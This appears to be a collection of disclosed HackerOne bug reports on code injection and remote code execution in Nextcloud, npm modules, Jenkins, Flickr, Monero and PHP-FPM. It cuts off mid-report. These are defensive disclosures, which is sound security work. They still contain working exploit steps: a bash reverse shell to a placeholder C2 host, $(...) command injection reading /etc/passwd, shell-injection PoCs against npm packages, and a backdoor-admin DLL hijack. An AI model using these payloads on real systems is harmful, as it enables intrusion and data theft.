### [[CRITICAL] Remote code execution on http://axa.dxi.eu](https://hackerone.com/reports/418308)

- **Report ID:** `418308`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** 8x8
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2020-06-09T20:41:31.624Z
- **CVE(s):** -

**Summary (team):**

The application allowed for upload of a file with PHP extension that when loaded on the server would evaluate embedded php source.

---

### [Code injection possible with malformed Nextcloud Talk chat commands](https://hackerone.com/reports/851807)

- **Report ID:** `851807`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Nextcloud
- **Reporter:** @covert-spectre
- **Bounty:** - usd
- **Disclosed:** 2020-06-02T14:54:13.000Z
- **CVE(s):** CVE-2020-8180

**Vulnerability Information:**

## Summary
The Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the "/command" syntax. Users can provide additional arguments to the commands, such as "/calc 1+1" or "/wiki Hello", which are passed to the underlying script using `@exec`. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax `/wiki test $(mycommand)`. This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.

## Links
- https://nextcloud-talk.readthedocs.io/en/latest/commands/#chat-commands
- https://github.com/nextcloud/spreed/issues/1566
- https://github.com/nextcloud/spreed/blob/384f39ded1dceab58491555744bd5326f8ff1e3f/lib/Chat/Command/ShellExecutor.php#L103

## Severity
This bug has been filed with a severity of `Critical` inline with the bounty impact/definition chart and the Nextcloud Threat Model as the bug allows both remote code execution via a non-admin user as well as access of complete user data of any other user. 

## Affected Versions
All versions that support Talk Commands appear to be affected as the bug is in the `@execute` command. 
The following version were tested: 
- master-2020-04-15 via `snap install nextcloud --edge`, `occ.status versionstring: 19.0.0 beta 2`
- 17.0.5snap1 via `snap install nextcloud`, `occ.status versionstring: 17.0.5`

## Repro Steps
1. Install and Setup Nextcloud
   1. create Ubuntu 18.04 VM
   2. install Nextcloud Server (Nextcloud Hub snap used for this test `snap install nextcloud --edge`)
   3. run install command: `nextcloud.manual-install "admin" "password"`
   4. generate self signed certificate `nextcloud.enable-https self-signed`
   5. set trusted domains `nextcloud.occ config:system:set trusted_domains 1 --value=<domain/ip>`
   6. create user `alice`
   7. install and enable spreed/talk app
   8. enable sample talk commands `nextcloud.occ talk:command:add-samples`
   9. add calculator command as described in the [documentation here](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh)

2. Setup C2 VM
   1. kali used for this test, can be any host with netcat `nc`
   2. run nc listener `nc -l -p 8888`
3. Create Shell Script > shell.sh
   > This script can be anything that gets executed and returns a shell
   > In this case, a simple reverse shell is initiated using bash interactive piping to /dev/tcp
   > A php web shell, meterpreter binary or any other executable could be uploaded here
   ```
   bash -i >& /dev/tcp/<c2-ip-here>/8888 0>&1 &
   ```
4. Log In As Alice and Upload File
   1. upload above shell.sh to root directory of alice's Nexcloud files

5. With Alice, start a Talk Conversation

6. Test Exploitability:
    > Note, all commands appear to get successfully executed, however whether output is shown depends on the implementation of the backing script. For example, /wiki cannot show the results of `cat /etc/passwd` because the multiline output breaks the wiki script, but the [calculator sample](https://nextcloud-talk.readthedocs.io/en/latest/commands/#create-pathtocalcsh) can show the output because it has an echo command in the scrpt. 
    ```
    /wiki test $(id)
    /wiki test $(pwd)
    /wiki test $(ls -al .)
    /calc test $(cat /etc/passwd)
    /calc test $(ls -al ../)
    ```

7. Execute Reverse Shell
   1. Locate uploaded shell script 
      1. For nextcloud snap, the data directory is defined [here](https://github.com/nextcloud/nextcloud-snap#where-is-my-stuff)
      2. File locations are fixed, therefore, once the root directory is known, it is easy to derive the location of the script
      3. Can use `/calc test $(ls ../)` to explore directory structure
   2. Enable execution of the script
   3. Execute the script
    ```
    /wiki test $(chmod +x /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)
    /wiki test $(bash /var/snap/nextcloud/common/nextcloud/data/alice/files/shell.sh)
    ```

8. Observer C2 Listener for Connection

9. Run Commands via C2
    ```
    id 
    pwd
    cd /var/snap/nextcloud/common/nextcloud/data/admin/files
    ls -al
    occ status
    ```

## Attachments
See attached screenshots

## Impact

- Complete access to all user files
- Shell access to occ
- Shell access to host machine - root access if Nextcloud is running as root

**Summary (researcher):**

The Nextcloud Talk app allows system administrators to setup chat commands that can be executed in Talk using the "/command" syntax. Users can provide additional arguments to the commands, such as "/calc 1+1" or "/wiki Hello", which are passed to the underlying script using @exec. If arguments are accepted, it is possible to trigger arbitrary code by wrapping the code in bash subcommand syntax /wiki test $(mycommand). This allows for arbitrary code execution, which an actor can use to spawn a reverse shell back from the remote machine.

---

### [[logkitty] RCE via insecure command formatting](https://hackerone.com/reports/825729)

- **Report ID:** `825729`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2020-05-09T08:42:11.023Z
- **CVE(s):** CVE-2020-8149

**Vulnerability Information:**

I would like to report a `RCE` issue in the `logkitty` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `logkitty`
**version:** `0.7.0`
**npm page:** `https://www.npmjs.com/package/logkitty`

## Module Description
> Display pretty Android and iOS logs without Android Studio or Console.app, with intuitive Command Line Interface.

## Module Stats
[170,222] downloads in the last week

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/zamotany/logkitty/blob/master/src/android/adb.ts#L55

## Steps To Reproduce:
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i logkitty # Install affected module
logkitty android app 'test; touch HACKED' #  Note the *touch command* is inside the *'* (single quote), so it's an argument, while it will be executed anyway
```
1. Recheck the files: now `HACKED` has been created :) {F754955}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `logkitty`

---

### [potential RCE and XSS via file upload requiring user account and default settings](https://hackerone.com/reports/678727)

- **Report ID:** `678727`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Nextcloud
- **Reporter:** @rcejules
- **Bounty:** - usd
- **Disclosed:** 2020-04-01T08:50:37.020Z
- **CVE(s):** -

**Vulnerability Information:**

#potential RCE and XSS via file upload requiring user account and default settings

##Requirements
1. User account that can upload files (NO admin)
2. User account name on creation (usually the same as on creation/displayed name)
3. data directory inside of nextcloud server folder (suggested by /var/www/nextcloud/config/config.sample.php)

##Tested on
current release
Version 16.0.4.1
stable
Build: '2019-08-14T18:57:27+00:00 a1a245e88202d834f08f4c2e4451dcbe9baee3aa'

##Basic idea
On nextcloud php files can be uploaded, but when clicked they are only shown in a text editor. If the URL to our skript is known, we get code execution. 
A RCE will work if the server has set it's data directory inside the nextcloud server folder and the username is known. 

##config example
The following is located in /var/www/nextcloud/config/config.sample.php:
[https://github.com/nextcloud/server/blob/master/config/config.sample.php]
~~~~
 *
 * Default to ``data/`` in the Nextcloud directory.
 */
'datadirectory' => '/var/www/nextcloud/data',
~~~~
If this config is used, RCE is possible.

##Attack scenario: 
Short video attached.
(To reproduce use a nextcloud instance and setup a user named attacker. Use any php script called shell.php, and set the datadirectory to /var/www/nextcloud/data)

1. Login to obtained user account (assume his name is "attacker")
2. upload malicious php script. (assume it is called "shell.php")
3. navigate to https://www.ournextclouddomain.com/data/attacker/files/shell.php
4. see some shells poppin

This is possible since we know the direct path to our php script.

Note: This can also be used for XSS since we can upload any html file!

##Prevention
1. user accounts could extend a seed on their foldername like attacker-19320143158015
2. usage of a custom seed inside the data directory.
3. different config than on the example

## Impact

RCE, extract ser data or modify config file (if no special permissions are set), take over the server, also XSS is possible

---

### [Docker image with FPM is vulnerable to CVE-2019-11043](https://hackerone.com/reports/720306)

- **Report ID:** `720306`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Nextcloud
- **Reporter:** @beched
- **Bounty:** 100 usd
- **Disclosed:** 2020-03-14T10:09:58.162Z
- **CVE(s):** CVE-2019-11043

**Vulnerability Information:**

The CVE-2019-11043 vulnerability can be exploited in the latest nextcloud:fpm image.

This is due to the specific nginx configuration recommended for nextcloud:
https://github.com/nextcloud/docker#base-version---fpm
https://github.com/nextcloud/documentation/blob/master/admin_manual/installation/nginx.rst
https://github.com/nextcloud/docker/blob/master/.examples/docker-compose/with-nginx-proxy/mariadb/fpm/web/nginx.conf

Here's the exploit: https://github.com/neex/phuip-fpizdam

Sample exploit run:
# ./phuip-fpizdam http://localhost:8080/ocs/v2.php
2019/10/22 19:36:29 Base status code is 200
2019/10/22 19:36:30 Status code 502 for qsl=1765, adding as a candidate
2019/10/22 19:36:31 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
2019/10/22 19:36:48 Attack params found: --qsl 1760 --pisos 191 --skip-detect
2019/10/22 19:36:48 Trying to set "session.auto_start=0"...
2019/10/22 19:36:50 Detect() returned attack params: --qsl 1760 --pisos 191 --skip-detect <-- REMEMBER THIS
2019/10/22 19:36:50 Performing attack using php.ini settings...
2019/10/22 19:36:52 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2019/10/22 19:36:52 Trying to cleanup /tmp/a...
2019/10/22 19:36:52 Done!

To fix the issue, you need to update PHP-FPM version in the nextcloud:fpm image.
Reference: https://bugs.php.net/bug.php?id=78599

## Impact

Execute arbitrary PHP code on the target server

---

### [[blamer] RCE via insecure command formatting](https://hackerone.com/reports/772448)

- **Report ID:** `772448`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2020-03-10T09:38:42.363Z
- **CVE(s):** CVE-2020-8137

**Vulnerability Information:**

I would like to report a `RCE` issue in the `blamer` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `blamer`
**version:** `0.1.13`
**npm page:** `https://www.npmjs.com/package/blamer`

## Module Description
> Blamer is a tool for get information about author of code from version control system. Supports git and subversion.

## Module Stats
[~1800] downloads in the last day
[12,910] downloads in the last week
[~52k] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/kucherenko/blamer/blob/master/src/vcs/git.js#L24

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var Blamer = require('blamer');
var blamer = new Blamer('git');
blamer.blameByFile('poc.js', 'test; touch HACKED;#');

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i blamer # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F681902}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `blamer`

---

### [(Authenticated) RCE by bypassing of the .htaccess blacklist](https://hackerone.com/reports/228825)

- **Report ID:** `228825`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Nextcloud
- **Reporter:** @icewind1991
- **Bounty:** - usd
- **Disclosed:** 2020-03-01T11:02:56.685Z
- **CVE(s):** -

**Vulnerability Information:**

`Storage::copyFromStorage` doesn't check the content of a folder it copies against the list of blacklisted files.
Meaning that if a user has access to an external storage (inc. fed. shares) that contains a .htaccess file, he can move the .htaccess file to the local data directory.

The attack works on any nextcloud/owncloud since federated sharing was introduced that uses apache and has the data directory inside the webroot (as is default)

Steps to reproduce:
- Setup an evil instance (nc1) that has the file blacklist disabled (Filesystem.php line 616)
- create a folder 'sharefolder/attack' in nc1 with the following files
  - .htaccess configured to "allow from all"
  - attack.php with the desired attack
- Setup a non-evil instance (nc2) (or pick an existing nc instance that you want to attack)
- Federated share 'sharefolder' from nc1 to nc2
- In nc2, move 'sharefolder/attack' to 'attack' (outside the share)
- navigate to http://nc2/data/userid/files/attack/attack.php

---

### [Several simple remote code execution in pdf-image](https://hackerone.com/reports/781664)

- **Report ID:** `781664`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @gabriel-kimiaie
- **Bounty:** - usd
- **Disclosed:** 2020-02-24T08:00:21.436Z
- **CVE(s):** CVE-2020-8132

**Vulnerability Information:**

I would like to report "A simple remote code execution" in "pdf-image".
It allows "a remote attacker to execute arbitrary code when several functions of the PDFImage class are called and the class loaded from user-input value".

# Module

**module name:** pdf-image
**version:** latest
**npm page:** `https://www.npmjs.com/package/pdf-image`

## Module Description

Provides an interface to convert PDF's pages to png files in Node.js by using ImageMagick.

## Module Stats

[1] weekly downloads: 8,691

# Vulnerability

## Vulnerability Description

Hello there ! I understand this bug isn't eligible for a bounty. I am reporting it either way. I've found several code execution in the pdf-image class, I tested one of them. They are simple and of course come from the child_process.exec call with lack of escaping. I tested one of them.

## Steps To Reproduce:

var PDFImage = require("pdf-image").PDFImage;

var pdfImage = new PDFImage('"; sleep 500 #"');
pdfImage.getInfo();

You can also exploit the vulnerability by submitting  backticks (example payload: `ls;sleep 5` which will be executed even though you're double-quoting the input.

## Patch
You can take example on your command-exists npm class:
var isUsingWindows = process.platform == 'win32'
var cleanInput = function(s) {
  if (/[^A-Za-z0-9_\/:=-]/.test(s)) {
    s = "'"+s.replace(/'/g,"'\\''")+"'";
    s = s.replace(/^(?:'')+/g, '') // unduplicate single-quote at the beginning
      .replace(/\\'''/g, "\\'" ); // remove non-escaped single-quote if there are enclosed between 2 escaped
  }
  return s;
}

if (isUsingWindows) {
  cleanInput = function(s) {
    var isPathName = /[\\]/.test(s);
    if (isPathName) {
      var dirname = '"' + path.dirname(s) + '"';
      var basename = '"' + path.basename(s) + '"';
      return dirname + ':' + basename;
    }
    return '"' + s + '"';
  }
}
## Supporting Material/References:

https://github.com/mooz/node-pdf-image/blob/master/index.js#L27

- Linux / centOS
- v6.17.1
- 3.10.10 
- N/A
- Own sample script

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] N
- I opened an issue in the related repository: [Y/N] N

Thanks!

## Impact

Bad code relying on that class can feel foul to RCE.

---

### [(Critical) Remote Code Execution Through Old TinyMCE upload bypass](https://hackerone.com/reports/778629)

- **Report ID:** `778629`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** 8x8
- **Reporter:** @konqi
- **Bounty:** - usd
- **Disclosed:** 2020-02-12T20:01:50.918Z
- **CVE(s):** -

**Summary (team):**

A third party marketing site utilized an outdated version of TinyMCE that was vulnerable to CVE-2011-4906.

---

### [Modify Host Header which is sent to email](https://hackerone.com/reports/791293)

- **Report ID:** `791293`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Endless Group
- **Reporter:** @codermak
- **Bounty:** - usd
- **Disclosed:** 2020-02-12T12:24:39.537Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Modify host header and include the fake website in password reset email.  Password reset mail is taking source domain from request header host, which can be modified using burp suite and the modified link is sent to the victims email

## Steps To Reproduce:

  1. Go to  https://da.theendlessweb.com:2222/
  2. Start burp suite
  3. Enter username and click on Send me a Link
  4. Intercep the request and modify the URL to some other custom url
  5. Forward the modified request
  6. Password reset email will be sent.
  7. Check your email and you will see the new url (which was configured in step 4) in the email.

## Supporting Material/References:

  * Snapshots in attachment

## Impact

With this, attacker can make any victim to visit their custom website and can affect the victim in many ways

---

### [Public instance of Jenkins on https://██████████/ with /script enabled](https://hackerone.com/reports/768266)

- **Report ID:** `768266`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @niteshsurana
- **Bounty:** - usd
- **Disclosed:** 2020-01-31T13:58:19.278Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An Amazon instance was found on https://█████/ running Jenkins. On analysing the SSL certificate, I reported here to the DoD.

**Description:**
On checking the SSL certificate, the details show:

```
Issued to and Issued By records:

CN: █████
Organization(O): █████████
Organizational Unit (OU): ███
```
Here, this instance is already authenticated and this does not require a password to login. The major impact of this vulnerability is, an attacker can exploit and gain access to critical internals of the server as `/script` is enabled.

Through `/script`, an attacker can run remote commands on the server through the Java programming language.

## Impact

Unauthenticated instances of Jenkins with `/script` enabled can lead to an attacker running remote command on the instance.

## Step-by-step Reproduction Instructions

1. Go to https://███/script/
  1.1 Check the SSL certificate for proof.

2. In the textbox that comes up, enter the following code:

```bash
"ls /".execute().text
```

3. The Response is

```
Result: bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

After verifying this issue, I looked up `██████████` and `█████`. That's how I confirmed that this instance was of critical importance.

## Product, Version, and Configuration (If applicable)

Jenkins

## Suggested Mitigation/Remediation Actions:

Mitigation for this, as per my understanding would be to add a 2FA authentication if this instance is in use. If this instance is not in use, please shut down the instance.

P.S: I've also attached a PoC video of the same for clarity and reference. I am reporting this issue to the US DOD as ██████████ would be more logical to be associated with the DOD. If this bug is not acknowledged here, please forward this report to the authority that handles the US ███████.

## Impact

On a Jenkins instance with `/script` enabled, an attacker can remote commands on the server and this can later lead to critical information leakage, lateral movement and other catastrophic events as the instance can be manipulated by the skills of the attacker.

Such instances should be closed when not in use and authentication mechanisms should be properly enforced.

---

### [Arbitrary file read via ffmpeg HLS parser at https://www.flickr.com/photos/upload](https://hackerone.com/reports/487008)

- **Report ID:** `487008`
- **Severity:** Critical
- **Weakness:** Code Injection
- **Program:** Flickr
- **Reporter:** @asad0x01_
- **Bounty:** - usd
- **Disclosed:** 2020-01-25T00:03:06.058Z
- **CVE(s):** -

**Vulnerability Information:**

Summary: FFmpeg is a video and audio software that is used for generating previews and for converting videos. Your current installation allows HLS playlists that contain references to external files, which leads to local file disclosure.


Steps to Reproduce:
1.Download the attached file. {F413554}

2.Go to https://www.flickr.com/photos/upload/ and upload the attached file.

3.Now go to https://www.flickr.com/cameraroll and you should be able to see contents of /etc/passwd. {F413555}
For clear view open the video from **Photostream** section.

Please let me know if you need any help :)

## Impact

An attacker can read files of etc/passwd or other contents.Also what I've seen it is possible to escalate this vulnerability to SSRF(https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf).Since I don't have any server I couldn't test :(

---

### [[tree-kill] RCE via insecure command concatenation (only Windows)](https://hackerone.com/reports/701183)

- **Report ID:** `701183`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2019-12-04T19:54:11.050Z
- **CVE(s):** CVE-2019-15599

**Vulnerability Information:**

I would like to report a `RCE` issue in the `tree-kill` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `tree-kill`
**version:** `1.2.1`
**npm page:** `https://www.npmjs.com/package/tree-kill`

## Module Description
> Kill all processes in the process tree, including the root process.

## Module Stats
[N/A] downloads in the last day
[2,108,440] downloads in the last week
[~10M] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated with a `command` that will be executed without any check. The issue arises here: https://github.com/pkrumins/node-tree-kill/blob/master/index.js#L20 (as you can see, the `Linux` part is sanitized, while the `Win` one no ... it simply uses the `+` operand to concatenate the input)

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var kill = require('tree-kill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```
1. Execute the following commands in another terminal:

```bash
npm i tree-kill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```
1. A new file called `HACKED.txt` will be created, containing the `HACKED` string
Note I can't provide a screenshot as I'm working on `Linux` (I'll be able to reinstall win only the next week), but the code showed in the module (line 20) makes clear the attack is possible. Pls note I'm not sure of the `batch syntax used` , as said I can't verify it on a `win` machine. Before close the report, share with me eventual problems, in order to make me able to determine if the provided PoC is fully working or lacks in something :)

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux (should be used a `win OS` ... I've simply checked the code)
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` on `tree-kill` via `insecure command concatenation`

---

### [[treekill] RCE via insecure command concatenation (only Windows)](https://hackerone.com/reports/703415)

- **Report ID:** `703415`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2019-12-04T19:45:24.217Z
- **CVE(s):** CVE-2019-15598

**Vulnerability Information:**

I would like to report a `RCE` issue in the `treekill` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `treekill`
**version:** `1.0.0`
**npm page:** `https://www.npmjs.com/package/treekill`

## Module Description
> treekill process and it's all children and child offspring children.

## Module Stats
[N/A] downloads in the last day
[106] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: https://github.com/node-modules/treekill/blob/master/index.js#L32
(as you can see, the `Linux` part is `sanitized`, while the `Win` one no ... it simply uses the `+` operand to concatenate the input)

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var kill = require('treekill');
kill('3333332 & echo "HACKED" > HACKED.txt & ');
```
1. Execute the following commands in terminal:

```bash
npm i tree-kill # Install affected module
dir # Check *HACKED.txt* doesn't exist
node poc.js #  Run the PoC
dir # Now *HACKED.txt* exists :)
```
1. The `HACKED.txt` has been created

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

PS: Note I'm working on a LInux machine, so I'm not sure if the syntax used to inject the command is successfull ... anyway, the issue is possible, as you can see from the code. If you'll not be able to reproduce the PoC, let me know and I'll switch on a `Win` machine in order to make working the PoC.

## Impact

`RCE` on `treekill` via `insecure command concatenation`

---

### [[node-df] RCE via insecure command concatenation](https://hackerone.com/reports/703412)

- **Report ID:** `703412`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Node.js third-party modules
- **Reporter:** @mik317
- **Bounty:** - usd
- **Disclosed:** 2019-12-04T19:33:22.380Z
- **CVE(s):** CVE-2019-15597

**Vulnerability Information:**

I would like to report a `RCE` issue in the `node-df` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `node-df`
**version:** `0.1.4`
**npm page:** `https://www.npmjs.com/package/node-df`

## Module Description
> node-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.

## Module Stats
[N/A] downloads in the last day
[3,023] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: 

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;touch HACKED',
        prefixMultiplier: 'GB',
        isDisplayPrefixMultiplier: true,
        precision: 2
    };
 
df(options, function (error, response) {
    if (error) { throw error; }
 
    console.log(JSON.stringify(response, null, 2));
});
```
1. Execute the following commands in terminal:

```bash
npm i node-df # Install affected module
ls # Make sure there isn't any *HACKED* file
node poc.js #  Run the PoC
ls # The *HACKED* file has been created
```
1. The `HACKED` file will be created {F594172}

## Patch
> Don't concatenate `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` on `node-df` via `insecure command concatenation`

---

### [Monero Wallet Gui for Windows (Arbitrary Code Execution)](https://hackerone.com/reports/630903)

- **Report ID:** `630903`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Monero
- **Reporter:** @l00ph0le
- **Bounty:** - usd
- **Disclosed:** 2019-11-18T21:33:55.252Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:
The windows version of the monero-wallet-gui.exe application allows for code injection. The monero-wallet-gui.exe utilizes a precompiled OpenSSL library called libeay32.dll. This OpenSSL library is trying to read a configuration file that doesn’t exist. By default, on windows systems, authenticated users can create under the c:\ drive. A user with low privileges can create the folder structure and copy a malicious openssl config and .dll files into their path. When the monero-wallet-gui.exe application is executed, the malicious .dll file is also executed. 

Description: 
If you download Microsoft sys internals process monitor and execute it. Then open the monero-wallet-gui.exe application, you can see the “monero-wallet-gui.exe” binary trying to read a file called openssl.cnf and getting the result “PATH NOT FOUND”. See attached screenshot (FileNotFound.png).

I believe the issue can be resolved by compiling the OpenSSL library using –openssldir parameter and specifying a directory that can only be written too by administrators (i.e. C:\Program Files, C:\ProgramData). Currently it looks for the “ssl” directory in the parent directory of the Monero install path. For example, if I download the monero-gui-win-x64-v0.14.0.0.zip file and save it to the c: drive, then extract the file, the install path becomes “C:\monero-gui-win-x64-v0.14.0.0\monero-gui-v0.14.0.0”. When monero-wallet-gui.exe is executed, it looks for the openssl.cnf file in “C:\monero-gui-win-x64-v0.14.0.0\ssl”, which doesn’t exist.

I’ve included two example exploits for this;

Exploit example 1
calc.c – source code of my .dll file to execute calc.exe
calc.dll – compiled version of the calc.exe library
openssl-calc.cnf – example malicious openssl config

Exploit example 2
backdoor.c – source code my .dll file to create a local administrator, this uses a known uac bypass
backdoor.dll – compiled version of the local admin backdoor library
openssl-backdoor.cnf - example malicious openssl config

Steps To Reproduce:
Download and extract monero-gui-win-x64-v0.14.0.0.zip to c: drive.

Exploit 1 – calc.exe – See attached video calc.mp4
1.	Login with a low privileged user (part of Users group)
2.	Open a cmd.exe and issue command: mkdir C:\monero-gui-win-x64-v0.14.0.0\ssl
3.	Copy calc.dll C:\monero-gui-win-x64-v0.14.0.0\ssl
4.	Copy openssl-calc.cnf to C:\monero-gui-win-x64-v0.14.0.0\ssl
5.	Rename openssl-calc.cnf to openssl.cnf
6.	Logout of low privileged user.
7.	Login with local administrator.
8.	Launch monero-wallet-gui.exe application.
9.	Calc.exe with execute.

Exploit 2 – create a local admin user (uac bypass) – See attached video backdoor.mp4
1.	Login with a low privileged user (part of Users group)
2.	Open a cmd.exe and issue command: mkdir C:\monero-gui-win-x64-v0.14.0.0\ssl
3.	Copy backdoor.dll to C:\monero-gui-win-x64-v0.14.0.0\ssl 
4.	Copy openssl-backdoor.cnf .dll to C:\monero-gui-win-x64-v0.14.0.0\ssl 
5.	Rename openssl-backdoor.cnf to openssl.cnf
6.	Logout of low privileged user.
7.	Login with local administrator.
8.	Launch monero-wallet-gui.exe application.
9.	Open “Computer Management”
10.	Navigate to “System Tools” -> “Local Users and Groups” -> “Users”
11.	A new user of “backdoor” with a password of “backdoor” was added.
12.	Right click on “backdoor” and click “Properties”, then click “Member Of”.
13.	The “backdoor” user is part of the local administrator group.

How can the system be exploited with this bug?
DLL Hi-jacking can be used for many nefarious purposes. It can be used by malware to propagate and establish persistence on a workstation. It can be used to privilege escalation in the post exploitation phases of an attack.

## Impact

The impact is high. Successful exploitation leads to arbitrary code execution on the windows system. There are many actions a nefarious individual could accomplish with this vulnerability. In addition to post-exploitation privilege escalation, another example could be ransomware, or other malware.

---

### [GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]](https://hackerone.com/reports/198734)

- **Report ID:** `198734`
- **Severity:** High
- **Weakness:** Code Injection
- **Program:** Internet Bug Bounty
- **Reporter:** @ryat
- **Bounty:** - usd
- **Disclosed:** 2019-10-13T11:11:07.711Z
- **CVE(s):** -

**Vulnerability Information:**

#GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]

Taoguang Chen <[@chtg57](https://twitter.com/chtg57)> - Write Date: 2015.4.28

> A type-confusion vulnerability was discovered in GMP deserialization with crafted object's __wakeup() magic method that can be abused for updating any already assigned properties of any already created objects, this result in serious security issues.

Affected Versions
------------
Affected is PHP 5.6 < 5.6.30

Credits
------------
This vulnerability was disclosed by Taoguang Chen.

Description
------------
gmp.c
```
static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */
{
	...
	ALLOC_INIT_ZVAL(zv_ptr);
	if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
		|| Z_TYPE_P(zv_ptr) != IS_ARRAY
	) {
		zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);
		goto exit;
	}

	if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {
		zend_hash_copy(
			zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),
			(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)
		);
	}
```

zend_object_handlers.c
```
ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */
{
	zend_object *zobj;
	zobj = Z_OBJ_P(object);
	if (!zobj->properties) {
		rebuild_object_properties(zobj);
	}
	return zobj->properties;
}
```

